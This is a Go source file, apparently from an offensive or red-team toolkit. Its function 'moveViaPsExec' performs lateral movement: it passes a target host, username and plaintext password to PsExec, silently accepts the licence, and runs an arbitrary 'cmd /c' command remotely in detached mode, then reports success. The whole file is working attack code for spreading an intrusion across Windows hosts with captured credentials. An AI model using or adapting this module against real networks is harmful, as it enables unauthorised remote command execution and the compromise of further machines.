package lateral

import (
	"fmt"
)

// moveViaPsExec 通过 PsExec 执行横向移动
func (lm *LateralMover) moveViaPsExec(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodPsExec,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	args := []string{
		"\\\\" + targetAddr,
		"-u", credStr,
		"-p", req.Credentials.Password,
		"-accepteula",
		"-d",
	}

	args = append(args, "cmd", "/c", req.Command)

	output, err := lm.execCommand("psexec.exe", args...)
	result.Output = sanitizeOutput(output)

	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("PsExec execution failed: %v", err)
		return result
	}

	if contains(output, "started on") || contains(output, "process ID") {
		result.Success = true
		result.Message = "Command executed successfully via PsExec"
	} else {
		result.Success = false
		result.Message = "PsExec execution may have failed"
	}

	return result
}
